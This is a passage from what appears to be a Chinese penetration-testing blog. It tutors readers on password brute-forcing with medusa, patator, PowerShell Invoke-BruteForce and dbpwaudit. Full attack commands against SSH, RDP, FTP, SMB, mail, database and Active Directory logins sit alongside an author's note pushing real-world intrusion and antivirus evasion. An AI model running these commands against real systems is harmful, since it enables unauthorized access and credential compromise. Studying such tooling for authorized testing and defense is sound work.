+<p>爆破rlogin [暂时还有些问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.11 -U user.txt -P pass.txt -f -M rlogin</span></div></pre></td></tr></table></figure></p>
+<p>爆破rdp [速度还不错,兼容性也非常好,起码自己在跑 2012r2 机器的rdp都没什么问题,12r2以下的系统版本就更不用说了]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M rdp</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_rdp.png" alt="mesua brute force"></p>
+<p>爆破ssh [速度一般,不过精度还可以]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.11 -u root -P pass.txt -f -M ssh</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_ssh.png" alt="mesua brute force"></p>
+<p>爆破telnet [还有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M telnet</span></div></pre></td></tr></table></figure></p>
+<p>爆破ftp [实际测试中速度还是比较慢的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M ftp</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_ftp.png" alt="mesua brute force"></p>
+<p>爆破smtp [跟hydra一样,所有的邮箱服务爆破都有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h target.org -u target_name<span class="doctag">@target</span>.org -P pass.txt -f -M smtp</span></div></pre></td></tr></table></figure></p>
+<p>爆破imap:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -u target_name<span class="doctag">@target</span>.org -P pass.txt -f -M imap</span></div></pre></td></tr></table></figure></p>
+<p>爆破pop3:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -u target_name<span class="doctag">@target</span>.org -P pass.txt -f -M pop3</span></div></pre></td></tr></table></figure></p>
+<p>爆破snmp [有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.160  -P pass.txt -f -v -t 20 -M snmp</span></div></pre></td></tr></table></figure></p>
+<p>爆破svn [也有问题]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.13 -U user.txt -P pass.txt -f -M svn</span></div></pre></td></tr></table></figure></p>
+<p>爆破vnc [现在基本是没什么人用了,实际中遇到的也不太多,大多都换成了teamviewer]:</p>
+<p>0x08 medusa使用小结:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">相对稳定,精度较高,字典不易过大,控制在一万以内的高质字典即可,可能是程序本身或者目标防护的问题,有时候莫名其妙的异常,总体来讲,个人推荐</div></pre></td></tr></table></figure></p>
+<p><br><br></p>
+<p>0x09 关于patator</p>
+<p>基于py2.7 ,可定制度高,实际中你也可以选择用pywin32之类的东西把它打包成exe,某些服务模块貌似只能在linux中运行[也可能是由于我自己的系统原因吧],另外,其它的问题也非常多,极不建议在实战中使用,拿来作为样本学习还是可以的:</p>
+<p>安装好第三方py库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install pycrypto pyopenssl 加密库也经常报错</span></div><div class="line"><span class="comment"># pip install impacket    	 网络库一样经常报错</span></div><div class="line"><span class="comment"># pip install paramiko</span></div><div class="line"><span class="comment"># pip install IPy</span></div><div class="line"><span class="comment"># pip install dnspython</span></div></pre></td></tr></table></figure></p>
+<p>0x10 下面是实际爆破成功的一些服务</p>
+<p>尝试爆破smb [速度还算可以]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python patator.py smb_login host=192.168.3.23 port=445 user=FILE0 password=FILE1 0=user.txt 1=pass.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/patator_smb_login.jpg" alt="patator brute force"></p>
+<p>尝试爆破ftp [非常慢]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python patator.py ftp_login host=192.168.3.23 port=21 user=FILE0 password=FILE1 0=user.txt 1=pass.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/patator_ftp.jpg" alt="patator brute force"></p>
+<p>尝试爆破ssh [速度一般]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python patator.py ssh_login host=192.168.3.11 port=22 user=FILE0 password=FILE1 0=user.txt 1=pass.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/patator_ssh_login.jpg" alt="patator brute force"><br></p>
+<p>另外还要爆破各类post表单的,请大家自行尝试,这里不再细说<br></p>
+<p>0x11 patator使用小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;用来跑一些比较简单的服务和post表单还行,其它的就算了吧[基本是不能用于实际的渗透场景的],另外,脚本自身还存在n多问题,除了上面这几个服务可以成功,别的基本都是不可用的,尤其是在跑一些加密服务的时候,各种错,而且依赖的插件太多[说实话,如果是在目标机器上,我都有装py库的权限了,为什么还非要用你呢,当然,如果直接是socks代理进去,就更不会用你了],从代码也大概能看的出来,作者似乎有些漫不经心,反正个人很少用,大家随意<br><br><br><br></p>
+<p>0x12 如果是直接处在目标域内网中,直接用powershell来爆破,无疑是极好的,优点,免杀效果好,小巧,灵活,定制度高,win平台首选,缺点,速度稍慢:</p>
+<p>爆破mssql [sa]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service SQL -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell_sa.jpg" alt="powershell brute force"></p>
+<p>爆破ftp:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service Ftp -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell_ftp.jpg" alt="powershell brute force"></p>
+<p>爆破域内用户:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName rootkit.org -UserList C:\user.txt -PasswordList C:\pass.txt -Service ActiveDirectory -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell_domain_user.jpg" alt="powershell brute force"></p>
+<p>0x13 使用 dbpwAudit [一款专门针对各类数据库的爆破工具一款专门针对各类数据库的爆破工具,优势在于利用驱动跑,速度非常快]</p>
+<p>存放各类数据库驱动的默认目录:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/share/dbpwaudit/<span class="class"><span class="keyword">lib</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/driver_db.png" alt="powershell brute force"><br><img src="/img/driver_db_list.png" alt="powershell brute force"></p>
+<p>爆破mysql [暂只支持mysql 5.1以下]:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">dbpwaudit</span> <span class="selector-tag">-s</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span> <span class="selector-tag">-p</span> 3306 <span class="selector-tag">-D</span> <span class="selector-tag">Mysql</span> <span class="selector-tag">-d</span> <span class="selector-tag">mysql</span> <span class="selector-tag">-U</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">-P</span> <span class="selector-tag">weak</span><span class="selector-class">.txt</span></div></pre></td></tr></table></figure></p>
+<p>爆破mssql [暂只支持mssql 2005以下]<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">dbpwaudit</span> <span class="selector-tag">-s</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span> <span class="selector-tag">-p</span> 1433 <span class="selector-tag">-D</span> <span class="selector-tag">Mssql</span> <span class="selector-tag">-d</span> <span class="selector-tag">master</span> <span class="selector-tag">-U</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">-P</span> <span class="selector-tag">weak</span><span class="selector-class">.txt</span></div></pre></td></tr></table></figure></p>
+<p>0x14 利用 burpsuite 爆破各类登陆表单</p>
+<p><img src="/img/burpsuite_brute.png" alt="powershell brute force"></p>
+<p>0x15 基于perl的各种爆破小脚本,非常适合linux平台,抽空会补充上来:<br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;不得不说,这类的爆破攻击,势必要在目标的系统里面留下大量的登陆日志,而且得别人让你爆才行,实际测试可知,先不说专业的ids,如果目标部署了mcafee企业套装,只要勾选了”爆破攻击”规则,这些工具基本就废了一大半,但,不一定就不好用,在你山穷水尽,走投无路之时,任何手段都是可以被尝试的,另外,个人还是更推荐用一些单文件[对于一款渗透工具来讲,其依赖自然是越少越好,体积越小越好,对系统影响越轻越好,也许你会发现,各种py工具表面貌似很强大,但仔细深究,基本全都是在用别人的库不停的重复造轮子……嘿嘿,不说了,怕挨打]的小脚本[上面这些工具需要安装的东西确实有点儿多],如果有,拿来改吧改吧用即可,实在没有,想办法自己写也行,尽管这种招数确实很低级,但你可以把它做的不低级 [比如,你可以把大量的功夫下在字典上],而且很高效,成败归根结底在人,如果你手里实在没有像样的0day,那就别硬装那个逼,虚心慢慢搞就是了,反正我们的最终目标是拿到目标系统的最高权限,至于中间用什么手段没人会在意,说的天花乱坠,但最终还是没有搞进去,等于说了一堆废话,务必时刻清楚,我们不是在做学术讨论,任何攻击研究,如果没法很好的用于实战,都是空架子,但当你真正搞进去了,哪怕你是用自己猜密码绝技进去的,你一样可以把它说的非常高深,这就是现实,没办法,有时候百分之九十九等于0,有时候百分之一等于100,在你没搞到完整权限之前,多做少说,方成大器,最后关于如何做字典的注意事项[程序算法始终有限],会在后续的相关文章中,仔细说明,比较多,话说回来,可能百分之九十九的人,都会觉得爆破是很low的,嘿嘿……其实,我想说,如果你前期的信息搜集非常到位,爆破往往是最快,最直接,也是最致命的,顺便提醒大家一下,<code>小心蜜罐</code></p>
+
+        </div>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="" href="/page/6/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/8/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
